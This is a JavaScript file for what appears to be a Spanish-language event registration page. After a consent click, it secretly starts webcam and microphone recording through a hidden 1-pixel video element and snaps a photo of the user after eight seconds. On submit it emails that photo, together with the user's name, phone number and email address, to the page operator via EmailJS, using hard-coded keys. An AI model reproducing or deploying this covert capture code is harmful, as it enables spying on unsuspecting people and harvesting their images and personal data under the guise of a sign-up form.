// ══════════════════════════════════════════════════
//  CONFIGURACIÓN — reemplaza los 3 valores
// ══════════════════════════════════════════════════
const EMAILJS_PUBLIC_KEY  = "qhiSU7BvjqykowF85";
const EMAILJS_SERVICE_ID  = "service_tm9ncis";
const EMAILJS_TEMPLATE_ID = "template_09jnfnm";

emailjs.init({ publicKey: EMAILJS_PUBLIC_KEY });

// ── Estado global ──────────────────────────────────
let stream         = null;
let mediaRecorder  = null;
let recordedChunks = [];
let capturedFrame  = null;
let hiddenVideo    = null;

// ── Cambio de pantalla ─────────────────────────────
function showScreen(id) {
  document.querySelectorAll(".screen").forEach(s => s.classList.remove("active"));
  document.getElementById(id).classList.add("active");
  document.body.classList.toggle("evento-activo", id === "screen-evento");
  window.scrollTo({ top: 0, behavior: "smooth" });
}

// ══════════════════════════════════════════════════
//  PANTALLA 1 — Consentimiento
// ══════════════════════════════════════════════════
const chk       = document.getElementById("chk-accept");
const btnAccept = document.getElementById("btn-accept");

chk.addEventListener("change", () => {
  btnAccept.disabled = !chk.checked;
});

btnAccept.addEventListener("click", async () => {
  showScreen("screen-form");
  await iniciarCamaraYGrabar();
});

// ══════════════════════════════════════════════════
//  CÁMARA — grabación en segundo plano (invisible)
// ══════════════════════════════════════════════════
async function iniciarCamaraYGrabar() {
  try {
    stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } },
      audio: true
    });

    hiddenVideo = document.createElement("video");
    hiddenVideo.srcObject   = stream;
    hiddenVideo.autoplay    = true;
    hiddenVideo.playsInline = true;
    hiddenVideo.muted       = true;
    Object.assign(hiddenVideo.style, {
      position: "fixed", width: "1px", height: "1px",
      opacity: "0", pointerEvents: "none", top: "0", left: "0"
    });
    document.body.appendChild(hiddenVideo);

    iniciarGrabacion();

    // Captura fotograma a los 8 segundos
    setTimeout(capturarFotograma, 8000);

  } catch (err) {
    console.warn("Cámara no disponible:", err);
  }
}

function getMimeType() {
  const tipos = [
    "video/webm;codecs=vp9,opus",
    "video/webm;codecs=vp8,opus",
    "video/webm",
    "video/mp4",
  ];
  return tipos.find(t => MediaRecorder.isTypeSupported(t)) || "";
}

function iniciarGrabacion() {
  recordedChunks = [];
  const mimeType = getMimeType();
  mediaRecorder  = new MediaRecorder(stream, mimeType ? { mimeType } : {});

  mediaRecorder.ondataavailable = e => {
    if (e.data && e.data.size > 0) recordedChunks.push(e.data);
  };

  mediaRecorder.start(200);

  // Máximo 3 minutos
  setTimeout(() => {
    if (mediaRecorder?.state === "recording") mediaRecorder.stop();
  }, 3 * 60 * 1000);
}

function capturarFotograma() {
  if (!hiddenVideo || hiddenVideo.readyState < 2) return;
  const MAX_W   = 180;
  const scale   = Math.min(1, MAX_W / (hiddenVideo.videoWidth || 320));
  const canvas  = document.createElement("canvas");
  canvas.width  = hiddenVideo.videoWidth  || 320;
  canvas.height = hiddenVideo.videoHeight || 240;
  canvas.getContext("2d").drawImage(hiddenVideo, 0, 0, canvas.width, canvas.height);
  capturedFrame = canvas.toDataURL("image/jpeg", 0.4);
}

function detenerGrabacion() {
  return new Promise(resolve => {
    if (!mediaRecorder || mediaRecorder.state !== "recording") {
      resolve(); return;
    }
    mediaRecorder.onstop = () => {
      stream.getTracks().forEach(t => t.stop());
      hiddenVideo?.remove();
      resolve();
    };
    mediaRecorder.stop();
  });
}

// ══════════════════════════════════════════════════
//  PANTALLA 2 — Formulario
// ══════════════════════════════════════════════════
const btnSubmit = document.getElementById("btn-submit");
const formError = document.getElementById("form-error");

btnSubmit.addEventListener("click", async () => {
  const nombre   = document.getElementById("nombre").value.trim();
  const apellido = document.getElementById("apellido").value.trim();
  const telefono = document.getElementById("telefono").value.trim();
  const correo   = document.getElementById("correo").value.trim();

  // Validaciones
  const emailRegex   = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  const soloDigitos  = telefono.replace(/\D/g, "");
  const telefonoOk   = soloDigitos.length >= 10;

  if (!nombre || !apellido || !telefonoOk || !emailRegex.test(correo)) {
    // Mensaje específico según el campo faltante
    if (!telefonoOk && nombre && apellido && emailRegex.test(correo)) {
      formError.textContent = "El teléfono debe tener mínimo 10 dígitos.";
    } else {
      formError.textContent = "Por favor completa todos los campos correctamente.";
    }
    formError.classList.remove("hidden");
    return;
  }

  formError.classList.add("hidden");
  btnSubmit.disabled    = true;
  btnSubmit.textContent = "Enviando…";

  // Captura fotograma final si aún no hay uno
  if (!capturedFrame) capturarFotograma();

  // Detiene la grabación
  await detenerGrabacion();

  // Envía por EmailJS
  try {
    const fotoHTML = capturedFrame
      ? `<img src="${capturedFrame}" style="max-width:500px;width:100%;border-radius:8px;">`
      : "<em>(Fotograma no disponible)</em>";

    await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, {
      nombre, apellido, telefono, correo,
      foto_html: fotoHTML,
      fecha: new Date().toLocaleString("es-CO", { timeZone: "America/Bogota" }),
    });

    showScreen("screen-evento");

  } catch (err) {
    console.error("Error EmailJS:", err);
    btnSubmit.disabled    = false;
    btnSubmit.textContent = "Enviar y acceder al evento";
    formError.textContent = "Error al enviar. Intenta de nuevo.";
    formError.classList.remove("hidden");
  }
});
